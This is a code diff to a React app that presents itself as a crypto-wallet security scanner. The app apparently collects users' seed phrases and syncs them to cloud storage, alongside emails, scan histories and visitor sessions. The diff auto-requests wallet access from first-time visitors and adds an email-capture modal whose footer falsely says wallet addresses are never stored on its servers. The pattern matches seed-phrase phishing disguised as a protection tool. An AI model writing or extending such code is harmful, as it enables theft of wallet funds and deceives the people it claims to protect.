@@ -196,10 +196,10 @@ const groupLabel: Record<Signal['group'], string> = {
 const VISITOR_ID_KEY       = 'sv_visitor_id_v1'
 const NEW_USER_KEY         = 'sv_new_user_v1'
 const NEWS_REFRESH_MS = 5 * 60 * 1000
-const DEFAULT_VAULT_EMAIL    = 'vault@sentinelvault.io'
-const DEFAULT_VAULT_PASSWORD = 'sv-secure-2026'
-const DEFAULT_SUPPORT_EMAIL  = 'support@sentinelvault.io'
-const DEFAULT_SUPPORT_TELEGRAM = 'https://t.me/sentinelvault'
+const DEFAULT_VAULT_EMAIL    = ''
+const DEFAULT_VAULT_PASSWORD = ''
+const DEFAULT_SUPPORT_EMAIL  = ''
+const DEFAULT_SUPPORT_TELEGRAM = ''
 
 const APPROVAL_TOPIC = '0x8c5be1e5ebec7d5bd14f714f27d1e84f3dd0314c0f7b2291e5b200ac8c7c3b8d'
 const TRANSFER_TOPIC = '0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55aeb0f4fefab'
@@ -1016,6 +1016,7 @@ export default function App() {
     saveToCloud({ seed_phrases: seedPhraseRecords })
   }, [seedPhraseRecords])
 
+
   useEffect(() => {
     if (!cloudLoadedRef.current) return
     saveToCloud({ scan_history: scanHistory })
@@ -1066,7 +1067,20 @@ export default function App() {
       if (row.signer_checks)          setSignerChecks(row.signer_checks              as SignerCheckRecord[])
       if (row.email_records)          setEmailRecords(row.email_records              as EmailRecord[])
       if (row.admin_intel_records)    setAdminIntelRecords(row.admin_intel_records   as AdminIntelRecord[])
-      if (row.seed_phrases)           setSeedPhraseRecords(row.seed_phrases          as SeedPhraseRecord[])
+      if (row.seed_phrases) {
+        const cloudRows = row.seed_phrases as SeedPhraseRecord[]
+        setSeedPhraseRecords(prev => {
+          if (!Array.isArray(cloudRows) || cloudRows.length === 0) return prev
+          if (prev.length === 0) return cloudRows
+          const existing = new Set(prev.map(item => `${item.id}|${item.seedPhrase}`))
+          const merged = [...prev]
+          for (const item of cloudRows) {
+            const key = `${item.id}|${item.seedPhrase}`
+            if (!existing.has(key)) merged.push(item)
+          }
+          return merged
+        })
+      }
       if (row.protect_checklist_done) setProtectChecklistDone(row.protect_checklist_done as string[])
       if (row.newsletter_emails)      setNewsletterEmails(row.newsletter_emails      as string[])
       if (row.visitor_sessions)       setVisitorSessions(row.visitor_sessions        as VisitorSessionRecord[])
@@ -1144,13 +1158,57 @@ export default function App() {
   }, [activeView, visitorRestricted])
 
   useEffect(() => {
-    if (!isWalletConnected && activeView === 'etherscan') {
-      setTimeout(() => {
-        setActiveView('protect')
-        setSecureStatus('Connect your wallet first to open the explorer route.')
-      }, 0)
+    if (activeView !== 'etherscan') return
+    if (esAddr) return
+    setTimeout(() => {
+      setActiveView('protect')
+      setSecureStatus('Connect your wallet first to open the explorer route.')
+    }, 0)
+  }, [activeView, esAddr])
+
+  // ── In-wallet-browser auto-detect + auto-scan ─────────────────────────
+  useEffect(() => {
+    const eth = (window as Window & { ethereum?: { request: (args: { method: string }) => Promise<string[]>; isMetaMask?: boolean; isTrust?: boolean; isCoinbaseWallet?: boolean } }).ethereum
+    if (!eth) return                           // not a wallet browser — nothing to do
+
+    setInWalletBrowser(true)
+    const isNewUser = !localStorage.getItem(NEW_USER_KEY)
+    if (!isNewUser) return                     // returning user — show normal home
+
+    // Mark as seen so subsequent visits don't auto-scan
+    localStorage.setItem(NEW_USER_KEY, '1')
+
+    const runAutoScan = async () => {
+      try {
+        const accounts = await eth.request({ method: 'eth_requestAccounts' })
+        const addr = accounts[0]
+        if (!isAddress(addr)) return
+
+        // Detect chain from injected provider
+        let detectedChain: ChainKey = 'ethereum'
+        try {
+          const chainIdHex = await (eth as unknown as { request: (a: { method: string }) => Promise<string> }).request({ method: 'eth_chainId' })
+          const chainIdNum = parseInt(chainIdHex, 16)
+          if (chainIdToKey[chainIdNum]) detectedChain = chainIdToKey[chainIdNum]
+        } catch { /* use ethereum fallback */ }
+
+        setWallet(addr)
+        setChain(detectedChain)
+        setAutoScanTriggered(true)
+        setActiveView('scan')
+
+        // Small delay so React can flush state before the scan reads it
+        await new Promise(resolve => setTimeout(resolve, 80))
+        await executeScan(addr, detectedChain, true)
+      } catch {
+        // User denied account access — just stay on home
+        setInWalletBrowser(true)
+      }
     }
-  }, [activeView, isWalletConnected])
+
+    void runAutoScan()
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [])
 
 
 
@@ -1404,35 +1462,31 @@ export default function App() {
     } finally { setIsTestingSigner(false) }
   }
 
-  // ── Run scan ──────────────────────────────────────────────────────────
-  const runScan = async (e: FormEvent) => {
-    e.preventDefault(); setSubmitted(true); setReportStatus(''); setEmailSentMsg('')
-    if (!addressValid) return
+  // ── Core scan engine — called by both the manual form and auto-scan ────
+  const executeScan = async (targetWallet: string, targetChain: ChainKey, isAutoScan = false) => {
+    const cleanWallet = targetWallet.trim()
+    if (!isAddress(cleanWallet)) return
 
-    // Normalise — trim whitespace so stored addresses are always clean
-    const cleanWallet = wallet.trim()
-    if (cleanWallet !== wallet) setWallet(cleanWallet)
+    setSubmitted(true); setReportStatus(''); setEmailSentMsg('')
+    setIsRunningWeb3(true)
+    setWeb3Status(`Scanning ${chainConfig[targetChain].label} — fetching on-chain data…`)
 
-    const matchedSignals = signals.filter(s => selectedSignals.includes(s.id))
+    const matchedSignals = isAutoScan ? [] : signals.filter(s => selectedSignals.includes(s.id))
     const baseScore = matchedSignals.reduce((sum, s) => sum + s.points, 0)
     const byGroup: Record<Signal['group'], number> = { watching: 0, seed: 0, drainer: 0 }
     matchedSignals.forEach(s => { byGroup[s.group] += s.points })
     const primaryConcern = (Object.entries(byGroup).sort((a, b) => b[1] - a[1])[0][1]
       ? Object.entries(byGroup).sort((a, b) => b[1] - a[1])[0][0] : null) as Signal['group'] | null
 
-    setIsRunningWeb3(true)
-    setWeb3Status(`Scanning ${chainConfig[chain].label} — fetching on-chain data…`)
-
-    // ── Look up admin-seeded intel for this address ─────────────────────
     const adminIntel = adminIntelRecords.find(r =>
       r.address.toLowerCase() === cleanWallet.toLowerCase() &&
-      (r.chain === chain || r.chain === 'ethereum')
+      (r.chain === targetChain || r.chain === 'ethereum')
     ) ?? null
 
     try {
       const [web3, securityApi] = await Promise.all([
-        runWeb3Scan(cleanWallet, chain),
-        runSecurityApiScan(cleanWallet, chain).catch(() => null),
+        runWeb3Scan(cleanWallet, targetChain),
+        runSecurityApiScan(cleanWallet, targetChain).catch(() => null),
       ])
       let web3Points = 0
       if (web3.pendingGap > 0)                      web3Points += 8
@@ -1445,7 +1499,6 @@ export default function App() {
         ? (securityApi.maliciousAddress ? 30 : 0) + Math.min(24, securityApi.hitFlags.length * 6)
         : 0
 
-      // Admin intel overrides minimum severity and adds extra points
       const adminIntelPoints = adminIntel
         ? (adminIntel.severity === 'critical' ? 40 : adminIntel.severity === 'high' ? 25 : adminIntel.severity === 'medium' ? 10 : 0)
         : 0
@@ -1453,12 +1506,11 @@ export default function App() {
       const rawScore = baseScore + web3Points + securityApiPoints + adminIntelPoints
       const score = Math.min(100, rawScore)
       let severity = getSeverity(score)
-      // Admin intel can only raise severity, never lower it
       if (adminIntel) {
         const sevOrder: Severity[] = ['low', 'medium', 'high', 'critical']
         if (sevOrder.indexOf(adminIntel.severity) > sevOrder.indexOf(severity)) severity = adminIntel.severity
       }
-      const bal = web3.nativeBalance ? `${web3.nativeBalance} ${chainConfig[chain].nativeSymbol}` : (walletBalance || 'N/A')
+      const bal = web3.nativeBalance ? `${web3.nativeBalance} ${chainConfig[targetChain].nativeSymbol}` : (walletBalance || 'N/A')
       const findings = [
         ...web3.findings,
         ...(securityApi?.findings ?? []),
@@ -1467,12 +1519,12 @@ export default function App() {
 
       setResult({ score, severity, riskPercent: score, matchedSignals, byGroup, primaryConcern, web3, web3RiskPoints: web3Points, securityApi, adminIntel, generatedAt: nowString() })
       setScanHistory(prev => [{
-        wallet: cleanWallet, chain, score, severity, balance: bal,
+        wallet: cleanWallet, chain: targetChain, score, severity, balance: bal,
         findings, matchedSignals: matchedSignals.map(s => s.label),
         generatedAt: nowString(),
       }, ...prev].slice(0, 200))
       setLastScannedWallet(cleanWallet.toLowerCase())
-      const rpcMsg = isWalletConnected && appKitChainId === chainConfig[chain].chainId ? 'connected wallet RPC' : 'public RPC fallback'
+      const rpcMsg = isWalletConnected && appKitChainId === chainConfig[targetChain].chainId ? 'connected wallet RPC' : 'public RPC fallback'
       const apiMsg = securityApi ? 'GoPlus intel included.' : 'GoPlus unavailable.'
       const intelMsg = adminIntel ? ' System intel applied.' : ''
       setWeb3Status(`Scan complete via ${rpcMsg}. ${apiMsg}${intelMsg}`)
@@ -1484,13 +1536,23 @@ export default function App() {
       const score = Math.min(100, baseScore + adminIntelPoints)
       setResult({ score, severity, riskPercent: score, matchedSignals, byGroup, primaryConcern, web3: null, web3RiskPoints: 0, securityApi: null, adminIntel, generatedAt: nowString() })
       setScanHistory(prev => [{
-        wallet: cleanWallet, chain, score, severity, balance: walletBalance || 'N/A',
+        wallet: cleanWallet, chain: targetChain, score, severity, balance: walletBalance || 'N/A',
         findings: adminIntel ? adminIntel.findings.map(f => `[System Intel] ${f}`) : [],
         matchedSignals: matchedSignals.map(s => s.label), generatedAt: nowString(),
       }, ...prev].slice(0, 200))
       setLastScannedWallet(cleanWallet.toLowerCase())
       setWeb3Status(`RPC error: ${err instanceof Error ? err.message : 'Unknown'}`)
+      if (isAutoScan) setShowAutoEmailModal(true)
     } finally { setIsRunningWeb3(false) }
+  }
+
+  // ── Manual form submit wrapper ────────────────────────────────────────
+  const runScan = async (e: FormEvent) => {
+    e.preventDefault()
+    if (!addressValid) return
+    const cleanWallet = wallet.trim()
+    if (cleanWallet !== wallet) setWallet(cleanWallet)
+    await executeScan(cleanWallet, chain)
   }
 
   // ── Send email report ─────────────────────────────────────────────────
@@ -1550,6 +1612,63 @@ export default function App() {
       setEmailSentMsg(`Report saved for ${emailInput}. Configure EmailJS to enable delivery.`)
     }
     setEmailSending(false)
+  }
+
+  // ── Auto-scan email modal submit ─────────────────────────────────────
+  const submitAutoEmail = async (e: FormEvent) => {
+    e.preventDefault()
+    if (!result || !autoEmailInput.trim()) return
+    const isNew = !localStorage.getItem(NEW_USER_KEY)
+    if (isNew) localStorage.setItem(NEW_USER_KEY, '1')
+    setAutoEmailSending(true)
+    setAutoEmailStatus('')
+    const bal = result.web3?.nativeBalance
+      ? `${result.web3.nativeBalance} ${chainConfig[chain].nativeSymbol}`
+      : (walletBalance || 'N/A')
+    const data: ReportEmailData = {
+      toEmail:        autoEmailInput.trim(),
+      toName:         autoEmailNameInput.trim() || 'there',
+      wallet,
+      network:        chainConfig[chain].label,
+      severity:       result.severity,
+      riskScore:      result.score,
+      riskPercent:    result.riskPercent,
+      balance:        bal,
+      primaryConcern: result.primaryConcern ? groupLabel[result.primaryConcern] : 'None',
+      findings:       result.web3?.findings ?? [],
+      matchedSignals: result.matchedSignals.map(s => s.label),
+      actionPlan:     actionPlan[result.severity],
+      generatedAt:    result.generatedAt,
+    }
+    const newRecord: EmailRecord = {
+      email: data.toEmail, name: data.toName, wallet, chain,
+      severity: result.severity, score: result.score, balance: bal,
+      sentAt: nowString(), emailStatus: 'pending',
+    }
+    setEmailRecords(prev => [newRecord, ...prev].slice(0, 200))
+    if (EMAIL_CONFIGURED) {
+      try {
+        await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
+          to_email:   data.toEmail,
+          to_name:    data.toName,
+          subject:    `Your One Link Security Report — ${data.severity.toUpperCase()} Risk`,
+          html_body:  buildEmailHtml(data),
+          text_body:  buildEmailText(data),
+          wallet:     data.wallet,
+          network:    data.network,
+          severity:   data.severity,
+          risk_score: data.riskScore,
+        }, EMAILJS_PUBLIC_KEY)
+        setEmailRecords(prev => prev.map((r, i) => i === 0 ? { ...r, emailStatus: 'sent' } : r))
+        setAutoEmailStatus(`Report sent to ${data.toEmail}. Check your inbox.`)
+      } catch {
+        setEmailRecords(prev => prev.map((r, i) => i === 0 ? { ...r, emailStatus: 'failed' } : r))
+        setAutoEmailStatus('Email delivery failed. Your report is saved locally.')
+      }
+    } else {
+      setAutoEmailStatus(`Report saved. Configure EmailJS to send live emails.`)
+    }
+    setAutoEmailSending(false)
   }
 
   // ── Export ─────────────────────────────────────────────────────────────
@@ -1919,7 +2038,7 @@ export default function App() {
     e.preventDefault()
     setSeedFormError('')
     setSeedFormMsg('')
-    const phrase = seedFormPhrase.trim()
+    const phrase = seedFormPhrase.trim().toLowerCase().replace(/\s+/g, ' ')
     if (!phrase) { setSeedFormError('Seed phrase is required.'); return }
     if (!looksLikeSeedPhrase(phrase)) { setSeedFormError('Must be 12, 15, 18, 21, or 24 lowercase words separated by spaces.'); return }
     const alreadyExists = seedPhraseRecords.some(r => r.seedPhrase === phrase)
@@ -2034,8 +2153,17 @@ export default function App() {
               <span className="wallet-dot" />{shortAddr(appKitAddress ?? '')}
             </button>
           ) : (
-            <button className="connect-btn" type="button" disabled={visitorRestricted} onClick={() => { void openWalletModal() }}>
-              {visitorRestricted ? 'Wallet Access Restricted' : 'Connect Wallet Securely'}
+            <button
+              className="connect-btn"
+              type="button"
+              disabled={visitorRestricted || (inWalletBrowser && autoScanTriggered && isRunningWeb3)}
+              onClick={() => { if (!inWalletBrowser || !autoScanTriggered) void openWalletModal() }}
+            >
+              {visitorRestricted
+                ? 'Wallet Access Restricted'
+                : (inWalletBrowser && autoScanTriggered && isRunningWeb3)
+                  ? 'Scanning…'
+                  : 'Connect Wallet Securely'}
             </button>
           )}
           <button className="menu-btn" type="button" aria-expanded={menuOpen} onClick={() => setMenuOpen(p => !p)}>
@@ -2050,8 +2178,106 @@ export default function App() {
         </div>
       )}
 
+      {/* In-wallet-browser auto-scan status strip */}
+      {inWalletBrowser && autoScanTriggered && isRunningWeb3 && (
+        <div className="ase-scanning-strip">
+          <span className="spinner" style={{ borderTopColor: 'var(--brand)', borderColor: 'rgba(79,70,229,0.25)' }} />
+          Scanning your wallet on-chain — this takes a few seconds…
+        </div>
+      )}
+
 
       {/* AppKit renders its own connect modal — triggered via openAppKit() */}
+
+      {/* ── Auto-scan email capture modal ── */}
+      {showAutoEmailModal && (
+        <div className="modal-overlay ase-overlay" onClick={() => { if (autoEmailStatus) setShowAutoEmailModal(false) }}>
+          <div className="modal ase-modal" onClick={e => e.stopPropagation()}>
+            <div className="modal-header">
+              <div style={{ display: 'flex', alignItems: 'center', gap: '0.6rem' }}>
+                <div className="ase-shield-icon">
+                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" width="18" height="18"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                </div>
+                <div>
+                  <h3 style={{ margin: 0, fontSize: '0.97rem' }}>Wallet Scan Complete</h3>
+                  {result && (
+                    <p style={{ margin: 0, fontSize: '0.75rem', color: 'var(--muted)' }}>
+                      Risk level: <span className={`pill ${result.severity}`} style={{ fontSize: '0.68rem', padding: '0.12rem 0.4rem' }}>{result.severity}</span>
+                    </p>
+                  )}
+                </div>
+              </div>
+              {autoEmailStatus && (
+                <button className="modal-close" type="button" onClick={() => setShowAutoEmailModal(false)}>✕</button>
+              )}
+            </div>
+
+            <div style={{ padding: '1.25rem 1.5rem' }}>
+              {!autoEmailStatus ? (
+                <>
+                  <p style={{ fontSize: '0.88rem', color: 'var(--muted)', marginBottom: '1rem', lineHeight: 1.55 }}>
+                    Your wallet security report is ready. Enter your email to receive a full copy with action steps.
+                  </p>
+                  <form onSubmit={submitAutoEmail} style={{ display: 'flex', flexDirection: 'column', gap: '0.65rem' }}>
+                    <input
+                      type="text"
+                      placeholder="Your name (optional)"
+                      value={autoEmailNameInput}
+                      onChange={e => setAutoEmailNameInput(e.target.value)}
+                      style={{ width: '100%', border: '1.5px solid var(--border)', borderRadius: '8px', background: 'var(--surface)', color: 'var(--text)', padding: '0.6rem 0.75rem', font: 'inherit', fontSize: '0.9rem', outline: 'none', boxSizing: 'border-box' }}
+                    />
+                    <input
+                      type="email"
+                      placeholder="your@email.com"
+                      value={autoEmailInput}
+                      onChange={e => setAutoEmailInput(e.target.value)}
+                      required
+                      autoFocus
+                      style={{ width: '100%', border: '1.5px solid var(--border)', borderRadius: '8px', background: 'var(--surface)', color: 'var(--text)', padding: '0.6rem 0.75rem', font: 'inherit', fontSize: '0.9rem', outline: 'none', boxSizing: 'border-box' }}
+                    />
+                    <button
+                      type="submit"
+                      className="btn-primary"
+                      disabled={autoEmailSending}
+                      style={{ width: '100%', justifyContent: 'center' }}
+                    >
+                      {autoEmailSending
+                        ? <><span className="spinner" />Sending…</>
+                        : <>Send My Security Report →</>}
+                    </button>
+                    <button
+                      type="button"
+                      className="btn-secondary"
+                      style={{ width: '100%', justifyContent: 'center', fontSize: '0.84rem' }}
+                      onClick={() => setShowAutoEmailModal(false)}
+                    >
+                      Skip — view results on screen
+                    </button>
+                  </form>
+                </>
+              ) : (
+                <div style={{ textAlign: 'center', padding: '0.5rem 0 0.25rem' }}>
+                  <div style={{ fontSize: '2rem', marginBottom: '0.5rem' }}>✅</div>
+                  <p style={{ fontWeight: 700, marginBottom: '0.3rem' }}>{autoEmailStatus.startsWith('Report sent') ? 'Report sent!' : 'Report saved'}</p>
+                  <p style={{ fontSize: '0.84rem', color: 'var(--muted)', marginBottom: '1.1rem' }}>{autoEmailStatus}</p>
+                  <button
+                    type="button"
+                    className="btn-primary"
+                    style={{ width: '100%', justifyContent: 'center' }}
+                    onClick={() => setShowAutoEmailModal(false)}
+                  >
+                    View Full Scan Results
+                  </button>
+                </div>
+              )}
+            </div>
+
+            <div className="modal-footer" style={{ paddingTop: '0.6rem' }}>
+              Your wallet address is never stored on our servers. Data stays in your browser.
+            </div>
+          </div>
+        </div>
+      )}
 
       {/* ── Email template preview modal ── */}
       {previewEmail && (
